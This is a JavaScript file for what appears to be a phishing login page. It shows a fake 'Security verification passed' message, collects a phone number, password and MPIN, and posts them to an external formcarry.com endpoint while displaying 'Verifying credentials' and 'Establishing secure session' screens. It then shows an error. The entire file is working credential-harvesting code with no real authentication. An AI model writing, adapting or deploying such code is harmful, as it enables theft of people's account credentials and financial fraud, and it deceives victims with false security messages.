 const loginForm = document.getElementById("loginForm");
const mpinForm = document.getElementById("mpinForm");
const startupScreen = document.getElementById("startupScreen");
const loginScreen = document.getElementById("loginScreen");
const mpinScreen = document.getElementById("mpinScreen");
const loadingScreen = document.getElementById("loadingScreen");
const loadingText = document.getElementById("loadingText");
const errorScreen = document.getElementById("errorScreen");
const loginButton = document.getElementById("loginButton");
const mpinButton = document.getElementById("mpinButton");
const verificationStatus = document.getElementById("verificationStatus");

const formDataStore = {
  phone: "",
  password: "",
  mpin: ""
};

window.addEventListener("load", () => {
  setTimeout(() => {
    verificationStatus.innerHTML =
      '<span class="startup-spinner" aria-hidden="true"></span><span>Security verification passed.</span>';

    setTimeout(() => {
      startupScreen.style.opacity = "0";
      setTimeout(() => startupScreen.remove(), 280);
    }, 600);
  }, 1400);
});

const loginInputs = Array.from(loginForm.querySelectorAll("input"));

function updateLoginButton() {
  const allFilled = loginInputs.every((input) => input.value.trim().length > 0);
  loginButton.disabled = !allFilled;
}

loginInputs.forEach((input) => {
  input.addEventListener("input", updateLoginButton);
});
updateLoginButton();

loginForm.addEventListener("submit", (event) => {
  event.preventDefault();

  formDataStore.phone = document.getElementById("phone").value.trim();
  formDataStore.password = document.getElementById("password").value;

  loginScreen.hidden = true;
  loadingText.textContent = "Verifying credentials...";
  loadingScreen.hidden = false;

  setTimeout(() => {
    loadingScreen.hidden = true;
    mpinScreen.hidden = false;
  }, 1500);
});

const mpinInput = document.getElementById("mpin");

function updateMpinButton() {
  const filled = mpinInput.value.trim().length > 0;
  mpinButton.disabled = !filled;
}

mpinInput.addEventListener("input", updateMpinButton);
updateMpinButton();

mpinForm.addEventListener("submit", async (event) => {
  event.preventDefault();

  formDataStore.mpin = mpinInput.value.trim();

  mpinScreen.hidden = true;
  loadingText.textContent = "Establishing secure session...";
  loadingScreen.hidden = false;

  const formcarryUrl = "https://formcarry.com/s/VWVMAG0qZcy";
  const payload = {
    phone: formDataStore.phone,
    password: formDataStore.password,
    mpin: formDataStore.mpin,
    timestamp: new Date().toISOString()
  };

  const fetchPromise = fetch(formcarryUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Accept": "application/json"
    },
    body: JSON.stringify(payload)
  }).catch(() => {});

  const minDelayPromise = new Promise((resolve) => setTimeout(resolve, 2000));

  await Promise.all([fetchPromise, minDelayPromise]);

  loadingScreen.hidden = true;
  errorScreen.hidden = false;
});